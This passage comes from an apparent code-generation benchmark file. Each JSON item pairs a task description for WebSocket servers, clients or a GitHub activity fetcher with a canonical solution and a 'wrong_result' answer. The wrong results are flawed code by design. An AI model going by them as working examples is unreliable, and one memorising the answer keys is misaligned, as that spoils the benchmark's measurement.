AsyncIterator[Any] - Provides an async iterator for continuously receiving messages\n- send(websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None - Sends data through the WebSocket using the appropriate subprotocol",
    "Canonical_solution": "from typing import Any, AsyncIterator, Dict, List, Optional, Union\nfrom fastapi import FastAPI, Response, WebSocket, WebSocketDisconnect, status\nfrom jina.enums import WebsocketSubProtocols\nfrom jina.excepts import InternalNetworkError\nfrom jina.types.request.data import DataRequest\nfrom jina.types.request.status import StatusMessage\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: List[WebSocket] = []\n        self.protocol_dict: Dict[str, WebsocketSubProtocols] = {}\n\n    def get_client(self, websocket: WebSocket) -> str:\n        return f'{websocket.client.host}:{websocket.client.port}'\n\n    def get_subprotocol(self, headers: Dict):\n        try:\n            if 'sec-websocket-protocol' in headers:\n                subprotocol = WebsocketSubProtocols(headers['sec-websocket-protocol'])\n            elif b'sec-websocket-protocol' in headers:\n                subprotocol = WebsocketSubProtocols(headers[b'sec-websocket-protocol'].decode())\n            else:\n                subprotocol = WebsocketSubProtocols.JSON\n        except Exception:\n            subprotocol = WebsocketSubProtocols.JSON\n        return subprotocol\n\n    async def connect(self, websocket: WebSocket):\n        await websocket.accept()\n        subprotocol = self.get_subprotocol(dict(websocket.scope['headers']))\n        self.active_connections.append(websocket)\n        self.protocol_dict[self.get_client(websocket)] = subprotocol\n\n    def disconnect(self, websocket: WebSocket):\n        self.protocol_dict.pop(self.get_client(websocket))\n        self.active_connections.remove(websocket)\n\n    async def receive(self, websocket: WebSocket) -> Any:\n        subprotocol = self.protocol_dict[self.get_client(websocket)]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return await websocket.receive_json(mode='text')\n        elif subprotocol == WebsocketSubProtocols.BYTES:\n            return await websocket.receive_bytes()\n\n    async def iter(self, websocket: WebSocket) -> AsyncIterator[Any]:\n        try:\n            while True:\n                yield await self.receive(websocket)\n        except WebSocketDisconnect:\n            pass\n\n    async def send(self, websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None:\n        subprotocol = self.protocol_dict[self.get_client(websocket)]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return await websocket.send_json(data.to_dict(), mode='text')\n        elif subprotocol == WebsocketSubProtocols.BYTES:\n            return await websocket.send_bytes(data.to_bytes())",
    "Code_level": "Class-level",
    "FSMID_for_test": 48,
    "wrong_result": "```python\nfrom typing import List, Dict, Any, Union, AsyncIterator\nfrom websockets import WebSocketServerProtocol as WebSocket\nimport json\n\nclass WebsocketSubProtocols:\n    JSON = \"json\"\n    BYTES = \"bytes\"\n\nclass DataRequest:\n    pass\n\nclass StatusMessage:\n    pass\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: List[WebSocket] = []\n        self.protocol_dict: Dict[str, WebsocketSubProtocols] = {}\n\n    def get_client(self, websocket: WebSocket) -> str:\n        return f\"{websocket.remote_address[0]}:{websocket.remote_address[1]}\"\n\n    def get_subprotocol(self, headers: Dict) -> WebsocketSubProtocols:\n        if \"Sec-WebSocket-Protocol\" in headers:\n            subprotocol = headers[\"Sec-WebSocket-Protocol\"]\n            if subprotocol == WebsocketSubProtocols.JSON:\n                return WebsocketSubProtocols.JSON\n            elif subprotocol == WebsocketSubProtocols.BYTES:\n                return WebsocketSubProtocols.BYTES\n        return WebsocketSubProtocols.JSON\n\n    async def connect(self, websocket: WebSocket) -> None:\n        client_id = self.get_client(websocket)\n        subprotocol = self.get_subprotocol(websocket.request_headers)\n        self.protocol_dict[client_id] = subprotocol\n        self.active_connections.append(websocket)\n\n    async def disconnect(self, websocket: WebSocket) -> None:\n        client_id = self.get_client(websocket)\n        if client_id in self.protocol_dict:\n            del self.protocol_dict[client_id]\n        if websocket in self.active_connections:\n            self.active_connections.remove(websocket)\n\n    async def receive(self, websocket: WebSocket) -> Any:\n        message = await websocket.recv()\n        client_id = self.get_client(websocket)\n        protocol = self.protocol_dict.get(client_id, WebsocketSubProtocols.JSON)\n        if protocol == WebsocketSubProtocols.JSON:\n            return json.loads(message)\n        else:\n            return message\n\n    async def iter(self, websocket: WebSocket) -> AsyncIterator[Any]:\n        try:\n            while True:\n                yield await self.receive(websocket)\n        except Exception:\n            await self.disconnect(websocket)\n\n    async def send(self, websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None:\n        client_id = self.get_client(websocket)\n        protocol = self.protocol_dict.get(client_id, WebsocketSubProtocols.JSON)\n        if protocol == WebsocketSubProtocols.JSON:\n            await websocket.send(json.dumps(data.__dict__))\n        else:\n            await websocket.send(bytes(data))\n```"
  },
  {
    "Task_id": 45,
    "Instruction": "Task Description: Create an asynchronous function to fetch GitHub contributor activity data for a specific repository, filtering by time period and excluding certain users.\n\nFunction Description: This function retrieves GitHub events for a repository and processes them to track contributor activity, including created issues, pull requests, and merged commits. It filters events by date and excludes specified users, using GitHub's API with authentication.\n\nInput:\n- owner: str - GitHub repository owner username\n- repo: str - GitHub repository name\n- since: datetime - Minimum datetime for events to include\n- max: int (default=100) - Maximum number of events to fetch\n- excluded_users: set[str] | None (default=None) - Set of usernames to exclude\n- token: str | None (default=None) - GitHub API token (falls back to Marvin settings if None)\n\nOutput:\n- dict[str, dict[str, str | list]] - Dictionary mapping contributor usernames to their activity data, where each value is a dictionary containing:\n  - \"created_issues\": list - Opened issues by the contributor\n  - \"created_pull_requests\": list - Opened PRs by the contributor\n  - \"merged_commits\": list - Merged commits by the contributor (excluding merge commits)",
    "Canonical_solution": "import httpx\nimport marvin\nfrom datetime import datetime\n\nasync def fetch_contributor_data(\n    owner: str,\n    repo: str,\n    since: datetime,\n    max: int = 100,\n    excluded_users: set[str] | None = None,\n    token: str | None = None,\n) -> dict[str, dict[str, str | list]]:\n    if not excluded_users:\n        excluded_users = {}\n\n    if not token:\n        token = marvin.settings.github_token.get_secret_value()\n\n    events_url = f\"https://api.github.com/repos/{owner}/{repo}/events?per_page={max}\"\n\n    contributors_activity = {}\n\n    async with httpx.AsyncClient(\n        headers={\n            \"Accept\": \"application/vnd.github.v3+json\",\n            \"Authorization\": f\"token {token}\",\n        }\n    ) as client:\n        events = (await client.get(events_url)).json()\n\n        for event in events:\n            if (actor := event.get(\"actor\")) and actor[\"login\"] in excluded_users:\n                continue\n            created_at = datetime.fromisoformat(event[\"created_at\"].rstrip(\"Z\"))\n            if created_at < since:\n                continue\n\n            contributor_username = actor[\"login\"] if actor else \"unknown\"\n\n            if contributor_username not in contributors_activity:\n                contributors_activity[contributor_username] = {\n                    \"created_issues\": [],\n                    \"created_pull_requests\": [],\n                    \"merged_commits\": [],\n                }\n\n            if (\n                event[\"type\"] == \"IssuesEvent\"\n                and event[\"payload\"][\"action\"] == \"opened\"\n            ):\n                contributors_activity[contributor_username][\"created_issues\"].append(\n                    event[\"payload\"][\"issue\"]\n                )\n\n            elif (\n                event[\"type\"] == \"PullRequestEvent\"\n                and event[\"payload\"][\"action\"] == \"opened\"\n            ):\n                contributors_activity[contributor_username][\n                    \"created_pull_requests\"\n                ].append(event[\"payload\"][\"pull_request\"])\n\n            elif event[\"type\"] == \"PushEvent\":\n                for commit_data in event[\"payload\"][\"commits\"]:\n                    commit = (await client.get(commit_data[\"url\"])).json()\n                    commit_message = commit[\"commit\"][\"message\"].split(\"\\n\")\n                    cleaned_commit_message = \"\\n\".join(\n                        line\n                        for line in commit_message\n                        if not line.strip().lower().startswith(\"co-authored-by:\")\n                    )\n                    commit_msg = commit[\"commit\"][\"message\"] = cleaned_commit_message\n\n                    if (\n                        \"Merge remote-tracking branch\" not in commit_msg\n                        and \"Merge branch\" not in commit_msg\n                    ):\n                        contributors_activity[contributor_username][\n                            \"merged_commits\"\n                        ].append(commit)\n\n    return contributors_activity",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport asyncio\nimport aiohttp\nfrom datetime import datetime, timezone\nimport os\n\nasync def fetch_contributor_activity(owner, repo, since, max=100, excluded_users=None, token=None):\n    if excluded_users is None:\n        excluded_users = set()\n    if token is None:\n        token = os.getenv(\"GITHUB_TOKEN\")\n    \n    headers = {\"Authorization\": f\"token {token}\"} if token else {}\n    url = f\"https://api.github.com/repos/{owner}/{repo}/events\"\n    params = {\n        \"per_page\": min(max, 100),\n        \"page\": 1,\n    }\n\n    result = {}\n\n    async with aiohttp.ClientSession(headers=headers) as session:\n        while True:\n            async with session.get(url, params=params) as response:\n                if response.status != 200:\n                    break\n                events = await response.json()\n                if not events:\n                    break\n\n                for event in events:\n                    actor_login = event[\"actor\"][\"login\"]\n                    created_at = datetime.strptime(event[\"created_at\"], \"%Y-%m-%dT%H:%M:%SZ\").replace(tzinfo=timezone.utc)\n                    if created_at < since or actor_login in excluded_users:\n                        continue\n\n                    if actor_login not in result:\n                        result[actor_login] = {\n                            \"created_issues\": [],\n                            \"created_pull_requests\": [],\n                            \"merged_commits\": []\n                        }\n\n                    payload = event.get(\"payload\", {})\n                    if event[\"type\"] == \"IssuesEvent\" and payload.get(\"action\") == \"opened\":\n                        issue_url = payload[\"issue\"][\"html_url\"]\n                        result[actor_login][\"created_issues\"].append(issue_url)\n                    elif event[\"type\"] == \"PullRequestEvent\" and payload.get(\"action\") == \"opened\":\n                        pr_url = payload[\"pull_request\"][\"html_url\"]\n                        result[actor_login][\"created_pull_requests\"].append(pr_url)\n                    elif event[\"type\"] == \"PushEvent\":\n                        commit = next((c for c in payload.get(\"commits\", []) if not c[\"distinct\"]), None)\n                        if commit:\n                            result[actor_login][\"merged_commits\"].append(commit[\"url\"])\n\n                params[\"page\"] += 1\n                if len(events) < params[\"per_page\"]:\n                    break\n\n    return result\n```"
  },
  {
    "Task_id": 452,
    "Instruction": "Task Description: Create a WebSocket server class in Python using autobahn+twisted that can handle WebSocket connections and optionally integrate with a WSGI application.\n\nClass Description: WebSocketServer is a class that implements a WebSocket server using autobahn and twisted frameworks. It can run standalone for WebSocket communication or be combined with a WSGI application for hybrid HTTP/WebSocket services.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 8080)\n- wsFactory: WebSocketServerFactory - The factory that manages WebSocket protocol instances\n- wsResource: WebSocketResource - The resource that handles WebSocket connections\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 8080) -> None - Initializes the WebSocket server with specified host and port\n- start(wsgi_app: callable = None, ws_path: bytes = b'ws') -> None - Starts the server, optionally combining with a WSGI application at the specified path",
    "Canonical_solution": "from twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.wsgi import WSGIResource\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource, WSGIRootResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080):\n        self.host = host\n        self.port = port\n        \n        # Create WebSocket factory and protocol\n        self.wsFactory = WebSocketServerFactory(f\"ws://{self.host}:{self.port}\")\n        self.wsFactory.protocol = EchoServerProtocol\n        self.wsResource = WebSocketResource(self.wsFactory)\n\n    def start(self, wsgi_app=None, ws_path=b'ws'):\n        # Create root resource combining WSGI and WebSocket\n        if wsgi_app:\n            wsgiResource = WSGIResource(reactor, reactor.getThreadPool(), wsgi_app)\n            rootResource = WSGIRootResource(wsgiResource, {ws_path: self.wsResource})\n        else:\n            rootResource = self.wsResource\n\n        # Create site and start server\n        site = Site(rootResource)\n        reactor.listenTCP(self.port, site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "```python\nfrom twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.wsgi import WSGIResource\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol, listenWS\n\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 8080):\n        self.host = host\n        self.port = port\n        self.wsFactory = WebSocketServerFactory()\n        self.wsResource = None\n\n    def start(self, wsgi_app: callable = None, ws_path: bytes = b'ws'):\n        from twisted.web.resource import Resource, IResource\n        from zope.interface import implementer\n\n        @implementer(IResource)\n        class Root(Resource):\n            isLeaf = False\n\n            def __init__(self, wsgi_resource=None, ws_resource=None):\n                Resource.__init__(self)\n                if wsgi_resource:\n                    self.putChild(b'', wsgi_resource)\n                if ws_resource:\n                    self.putChild(ws_path, ws_resource)\n\n        root = Root()\n\n        if wsgi_app:\n            wsgi_resource = WSGIResource(reactor, reactor.getThreadPool(), wsgi_app)\n            root.putChild(b'', wsgi_resource)\n\n        self.wsResource = WebSocketResource(self.wsFactory)\n        root.putChild(ws_path, self.wsResource)\n\n        site = Site(root)\n        reactor.listenTCP(self.port, site, interface=self.host)\n        reactor.run()\n```"
  },
  {
    "Task_id": 459,
    "Instruction": "Task Description: Create a function that sets up and runs a WebSocket server in a separate thread, allowing for asynchronous communication between clients and the server.\n\nFunction Description: The function `run_websocket_server` initializes and starts a WebSocket server on a specified port. The server runs in a separate thread to avoid blocking the main program. It handles incoming messages by echoing them back to the client. The function returns the event loop and the thread object for potential external control.\n\nInput:  \n- `port` [int] - The port number on which the WebSocket server will listen for incoming connections.\n\nOutput:  \n- `event_loop` [asyncio.AbstractEventLoop] - The event loop associated with the WebSocket server, which can be used to manage or stop the server.  \n- `thd` [threading.Thread] - The thread object running the WebSocket server, which can be used to join or terminate the thread.",
    "Canonical_solution": "import asyncio\nimport websockets\nfrom threading import Thread\n\ndef run_websocket_server(port):\n    event_loop = asyncio.new_event_loop()\n\n    async def empty_server(websocket, path):\n        data = await websocket.recv()\n        await asyncio.sleep(0.02)\n        await websocket.send(data)\n\n    def run_server():\n        asyncio.set_event_loop(event_loop)\n        server = websockets.serve(empty_server, \"127.0.0.1\", port)\n        event_loop.run_until_complete(server)\n        event_loop.run_forever()\n\n    thd = Thread(target=run_server)\n    thd.start()\n    return event_loop, thd",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport threading\nimport websockets\n\nasync def echo(websocket, path):\n    async for message in websocket:\n        await websocket.send(message)\n\ndef run_websocket_server(port):\n    loop = asyncio.new_event_loop()\n    asyncio.set_event_loop(loop)\n\n    start_server = websockets.serve(echo, \"localhost\", port, loop=loop)\n\n    def run():\n        loop.run_until_complete(start_server)\n        loop.run_forever()\n\n    thd = threading.Thread(target=run)\n    thd.start()\n\n    return loop, thd\n```"
  },
  {
    "Task_id": 461,
    "Instruction": "Task Description: Implement a WebSocket server interface that manages client connections and facilitates message broadcasting in a synchronous manner using asyncio and threading.\n\nClass Description: SyncWebSocketInterface is a class that provides a synchronous interface to an asynchronous WebSocket server. It manages client connections, handles message broadcasting to all connected clients, and runs the asyncio event loop in a separate thread to maintain responsiveness.\n\nAttributes:\n\nclients: [set] - A set of connected WebSocket clients.\nloop: [asyncio.AbstractEventLoop] - The asyncio event loop used for WebSocket operations.\nthread: [threading.Thread] - The thread running the asyncio event loop.\n\nMethods:\n\n__init__: [Name]() -> [None] - Initializes the WebSocket interface, creates a new event loop, and starts it in a separate thread.\n_run_event_loop: [Name]() -> [None] - Internal method that runs the asyncio event loop in the dedicated thread.\n_run_async: [Name](coroutine) -> [None] - Runs a coroutine in the asyncio event loop from another thread.\n_send_to_all_clients: [Name](clients, msg) -> [None] - Internal async method to send a message to all specified clients.\nregister_client: [Name](websocket) -> [None] - Registers a new WebSocket client to the set of connected clients.\nunregister_client: [Name](websocket) -> [None] - Removes a WebSocket client from the set of connected clients.\ninternal_monologue: [Name](msg) -> [None] - Prints and broadcasts an internal monologue message to all clients.\nassistant_message: [Name](msg) -> [None] - Prints and broadcasts an assistant message to all clients.\nfunction_message: [Name](msg) -> [None] - Prints and broadcasts a function message to all clients.\nclose: [Name]() -> [None] - Stops the event loop and joins the thread, cleaning up resources.",
    "Canonical_solution": "import asyncio\nimport threading\nimport letta.server.ws_api.protocol as protocol\n\nclass SyncWebSocketInterface:\n    def __init__(self):\n        self.clients = set()\n        self.loop = asyncio.new_event_loop()\n        self.thread = threading.Thread(target=self._run_event_loop, daemon=True)\n        self.thread.start()\n\n    def _run_event_loop(self):\n        asyncio.set_event_loop(self.loop)\n        try:\n            self.loop.run_forever()\n        finally:\n            self.loop.run_until_complete(self.loop.shutdown_asyncgens())\n            self.loop.close()\n\n    def _run_async(self, coroutine):\n        if not self.loop.is_closed():\n            asyncio.run_coroutine_threadsafe(coroutine, self.loop)\n\n    async def _send_to_all_clients(self, clients, msg):\n        if clients:\n            await asyncio.gather(*(client.send_text(msg) for client in clients))\n\n    def register_client(self, websocket):\n        self.clients.add(websocket)\n\n    def unregister_client(self, websocket):\n        self.clients.remove(websocket)\n\n    def internal_monologue(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_internal_monologue(msg)))\n\n    def assistant_message(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_assistant_message(msg)))\n\n    def function_message(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_function_message(msg)))\n\n    def close(self):\n        self.loop.call_soon_threadsafe(self.loop.stop)\n        self.thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport threading\nfrom websockets.server import serve\nfrom typing import Set, Any\n\nclass SyncWebSocketInterface:\n    def __init__(self):\n        self.clients: Set[Any] = set()\n        self.loop = asyncio.new_event_loop()\n        self.thread = threading.Thread(target=self._run_event_loop, daemon=True)\n        self.thread.start()\n\n    def _run_event_loop(self):\n        asyncio.set_event_loop(self.loop)\n        self.loop.run_forever()\n\n    def _run_async(self, coroutine):\n        future = asyncio.run_coroutine_threadsafe(coroutine, self.loop)\n        return future.result()\n\n    async def _send_to_all_clients(self, msg):\n        if not self.clients:\n            return\n        await asyncio.gather(*[client.send(msg) for client in self.clients])\n\n    def register_client(self, websocket):\n        self._run_async(self.clients.add(websocket))\n\n    def unregister_client(self, websocket):\n        self._run_async(self.clients.discard(websocket))\n\n    def internal_monologue(self, msg):\n        print(f\"[Internal]: {msg}\")\n        self._run_async(self._send_to_all_clients(f\"[Internal]: {msg}\"))\n\n    def assistant_message(self, msg):\n        print(f\"[Assistant]: {msg}\")\n        self._run_async(self._send_to_all_clients(f\"[Assistant]: {msg}\"))\n\n    def function_message(self, msg):\n        print(f\"[Function]: {msg}\")\n        self._run_async(self._send_to_all_clients(f\"[Function]: {msg}\"))\n\n    async def _start_server(self):\n        async with serve(self._handle_connection, \"localhost\", 8765):\n            await asyncio.get_event_loop().create_future()\n\n    async def _handle_connection(self, websocket, path):\n        self.register_client(websocket)\n        try:\n            async for message in websocket:\n                pass\n        finally:\n            self.unregister_client(websocket)\n\n    def start(self):\n        self._run_async(self._start_server())\n\n    def close(self):\n        future = asyncio.run_coroutine_threadsafe(self.loop.shutdown_asyncgens(), self.loop)\n        future.result()\n        self.loop.call_soon_threadsafe(self.loop.stop)\n        self.thread.join()\n\n```"
  },
  {
    "Task_id": 462,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send appropriate responses based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, and responds based on the specified function in the message. It supports three main operations: echoing back a value, prompting for user input, and throwing an error message. The server runs indefinitely, maintaining persistent connections with clients.\n\nInput: \n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput: None (The function runs indefinitely, sending responses back through the WebSocket connection)\n\nThe function processes incoming JSON messages with the following structure:\n{\n    \"function\": str - The operation to perform (\"echo\", \"ask\", or \"throw\"),\n    \"args\": list - Arguments for the specified function\n}\n\nThe function sends back JSON responses with either:\n- A \"return\" field containing the result for successful operations\n- A \"throw\" field containing error messages for failures or unknown functions",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport websockets\nimport json\n\nasync def handler(websocket, path):\n    async for message in websocket:\n        try:\n            data = json.loads(message)\n            function = data.get(\"function\")\n            args = data.get(\"args\", [])\n\n            if function == \"echo\":\n                response = {\"return\": args[0] if args else \"No argument provided\"}\n            elif function == \"ask\":\n                response = {\"return\": f\"Input requested: {args[0] if args else 'Please provide input'}\"}\n            elif function == \"throw\":\n                response = {\"throw\": args[0] if args else \"Unknown error\"}\n            else:\n                response = {\"throw\": \"Unknown function\"}\n\n            await websocket.send(json.dumps(response))\n        except json.JSONDecodeError:\n            await websocket.send(json.dumps({\"throw\": \"Invalid JSON\"}))\n        except Exception as e:\n            await websocket.send(json.dumps({\"throw\": str(e)}))\n\nstart_server = websockets.serve(handler, \"localhost\", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()\n```"
  },
  {
    "Task_id": 468,
    "Instruction": "Task Description: Implement a WebSocket client for bidirectional audio streaming that connects to a server, records audio when a key is pressed, streams it to the server, and plays back received audio. The client should handle connection retries and manage audio streams efficiently.\n\nClass Description: The `Device` class represents a WebSocket client for audio streaming. It handles WebSocket connection management, audio recording and playback, and keyboard input for controlling the recording state.\n\nAttributes:\n- server_url: str - The URL of the WebSocket server to connect to.\n- p: pyaudio.PyAudio - PyAudio instance for handling audio streams.\n- websocket: websockets.WebSocketClientProtocol - The WebSocket connection object.\n- recording: bool - Flag indicating whether audio is currently being recorded.\n- input_stream: pyaudio.Stream - Audio input stream for recording.\n- output_stream: pyaudio.Stream - Audio output stream for playback.\n- spinner: yaspin.Yaspin - Spinner object for visual feedback during recording.\n- play_audio: bool - Flag controlling whether received audio should be played.\n- CHUNK: int - Number of audio frames per buffer.\n- FORMAT: int - Audio sample format (paInt16).\n- CHANNELS: int - Number of audio channels (1 for mono).\n- RECORDING_RATE: int - Sample rate for recording (16000 Hz).\n- PLAYBACK_RATE: int - Sample rate for playback (24000 Hz).\n\nMethods:\n- __init__() -> None - Initializes the Device instance with default values.\n- connect_with_retry(max_retries: int = 50, retry_delay: int = 2) -> None - Attempts to connect to the WebSocket server with retry logic.\n- send_audio() -> None - Handles audio recording and streaming to the server while recording is active.\n- receive_audio() -> None - Receives audio data from the server and plays it back if enabled.\n- on_press(key: keyboard.Key) -> None - Callback for key press events (starts recording when CTRL is pressed).\n- on_release(key: keyboard.Key) -> None - Callback for key release events (stops recording when CTRL is released).\n- main() -> None - Main coroutine that manages the WebSocket connection and audio tasks.\n- start() -> None - Starts the asyncio event loop to run the main coroutine.",
    "Canonical_solution": "import asyncio\nimport websockets\nimport pyaudio\nfrom pynput import keyboard\nimport json\nfrom yaspin import yaspin\n\nclass Device:\n    def __init__(self):\n        self.server_url = \"0.0.0.0:10001\"\n        self.p = pyaudio.PyAudio()\n        self.websocket = None\n        self.recording = False\n        self.input_stream = None\n        self.output_stream = None\n        self.spinner = yaspin()\n        self.play_audio = True\n        self.CHUNK = 1024\n        self.FORMAT = pyaudio.paInt16\n        self.CHANNELS = 1\n        self.RECORDING_RATE = 16000\n        self.PLAYBACK_RATE = 24000\n\n    async def connect_with_retry(self, max_retries=50, retry_delay=2):\n        for attempt in range(max_retries):\n            try:\n                self.websocket = await websockets.connect(f\"ws://{self.server_url}\")\n                return\n            except ConnectionRefusedError:\n                if attempt % 8 == 0 and attempt != 0:\n                    print(f\"Loading...\")\n                await asyncio.sleep(retry_delay)\n        raise Exception(\"Failed to connect to the server after multiple attempts\")\n\n    async def send_audio(self):\n        self.input_stream = self.p.open(format=self.FORMAT, channels=self.CHANNELS, rate=self.RECORDING_RATE, input=True, frames_per_buffer=self.CHUNK)\n        while True:\n            if self.recording:\n                try:\n                    await self.websocket.send(json.dumps({\"role\": \"user\", \"type\": \"audio\", \"format\": \"bytes.wav\", \"start\": True}))\n                    while self.recording:\n                        data = self.input_stream.read(self.CHUNK, exception_on_overflow=False)\n                        await self.websocket.send(data)\n                    await self.websocket.send(json.dumps({\"role\": \"user\", \"type\": \"audio\", \"format\": \"bytes.wav\", \"end\": True}))\n                except Exception as e:\n                    print(f\"Error in send_audio: {e}\")\n            await asyncio.sleep(0.01)\n\n    async def receive_audio(self):\n        self.output_stream = self.p.open(format=self.FORMAT, channels=self.CHANNELS, rate=self.PLAYBACK_RATE, output=True, frames_per_buffer=self.CHUNK)\n        while True:\n            try:\n                data = await self.websocket.recv()\n                if self.play_audio and isinstance(data, bytes) and not self.recording:\n                    self.output_stream.write(data)\n            except Exception as e:\n                await self.connect_with_retry()\n\n    def on_press(self, key):\n        if key == keyboard.Key.ctrl and not self.recording:\n            print(\"\")\n            self.spinner.start()\n            self.recording = True\n\n    def on_release(self, key):\n        if key == keyboard.Key.ctrl:\n            self.spinner.stop()\n            self.recording = False\n\n    async def main(self):\n        await self.connect_with_retry()\n        print(\"\\nHold CTRL to speak to your assistant. Press 'CTRL-C' to quit.\")\n        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)\n        listener.start()\n        await asyncio.gather(self.send_audio(), self.receive_audio())\n\n    def start(self):\n        asyncio.run(self.main())",
    "Code_level": "Class-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport websockets\nimport pyaudio\nimport keyboard\nfrom yaspin import yaspin\nimport threading\n\nclass Device:\n    def __init__(self):\n        self.server_url = \"ws://localhost:8765\"\n        self.p = pyaudio.PyAudio()\n        self.websocket = None\n        self.recording = False\n        self.input_stream = None\n        self.output_stream = None\n        self.spinner = yaspin(text=\"Recording\", color=\"yellow\")\n        self.play_audio = True\n        self.CHUNK = 1024\n        self.FORMAT = pyaudio.paInt16\n        self.CHANNELS = 1\n        self.RECORDING_RATE = 16000\n        self.PLAYBACK_RATE = 24000\n\n    def connect_with_retry(self, max_retries=50, retry_delay=2):\n        retries = 0\n        while retries < max_retries:\n            try:\n                self.websocket = websockets.connect(self.server_url)\n                return\n            except Exception as e:\n                print(f\"Connection failed ({e}), retrying in {retry_delay} seconds...\")\n                retries += 1\n                asyncio.sleep(retry_delay)\n        raise ConnectionError(\"Failed to connect to WebSocket server after multiple attempts.\")\n\n    async def send_audio(self):\n        self.input_stream = self.p.open(format=self.FORMAT,\n                                        channels=self.CHANNELS,\n                                        rate=self.RECORDING_RATE,\n                                        input=True,\n                                        frames_per_buffer=self.CHUNK)\n\n        self.spinner.start()\n        while self.recording:\n            data = self.input_stream.read(self.CHUNK)\n            await self.websocket.send(data)\n        self.spinner.stop()\n\n    async def receive_audio(self):\n        self.output_stream = self.p.open(format=self.FORMAT,\n                                         channels=self.CHANNELS,\n                                         rate=self.PLAYBACK_RATE,\n                                         output=True,\n                                         frames_per_buffer=self.CHUNK)\n\n        while True:\n            data = await self.websocket.recv()\n            if self.play_audio:\n                self.output_stream.write(data)\n\n    def on_press(self, key):\n        if key == keyboard.Key.ctrl:\n            self.recording = True\n\n    def on_release(self, key):\n        if key == keyboard.Key.ctrl:\n            self.recording = False\n\n    async def main(self):\n        self.connect_with_retry()\n        self.websocket = await self.websocket\n        keyboard.on_press(self.on_press)\n        keyboard.on_release(self.on_release)\n\n        send_task = asyncio.create_task(self.send_audio())\n        receive_task = asyncio.create_task(self.receive_audio())\n\n        await asyncio.gather(send_task, receive_task)\n\n    def start(self):\n        asyncio.run(self.main())\n```"
  },
  {
    "Task_id": 469,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle bidirectional communication between clients and the server, with support for message production and consumption through multiprocessing queues.\n\nFunction Description: The SocketWorker function establishes a WebSocket server that manages client connections, processes incoming messages, and sends messages to specific clients based on their unique IDs. It uses asynchronous programming to handle multiple clients concurrently.\n\nInput:\n- queueX: multiprocessing.Queue - Queue for outgoing messages to clients (format: (client_id, message))\n- queueZ: multiprocessing.Queue - Queue for incoming messages from clients (format: (client_id, message))\n\nOutput: None (The function runs indefinitely as a server process)\n\nMethods (nested async functions within SocketWorker):\n\n1. producer() -> Union[Tuple[str, str], str] - Generates messages to be sent to clients, either from queueX or periodic ping messages.\n\n2. producer_handler(websocket: WebSocketServerProtocol, path: str) -> None - Handles sending messages to connected clients via the WebSocket connection.\n\n3. consumer(websocket: WebSocketServerProtocol, msg: str) -> None - Processes incoming messages from clients, handling pong responses and forwarding valid requests to queueZ.\n\n4. consumer_handler(websocket: WebSocketServerProtocol, path: str) -> None - Continuously receives messages from a client connection and processes them.\n\n5. server(websocket: WebSocketServerProtocol, path: str) -> None - Main connection handler that manages client lifecycle, assigning unique IDs and coordinating producer/consumer tasks.\n\n6. srv_exception(loop: asyncio.AbstractEventLoop, context: dict) -> None - Exception handler for the WebSocket server event loop.",
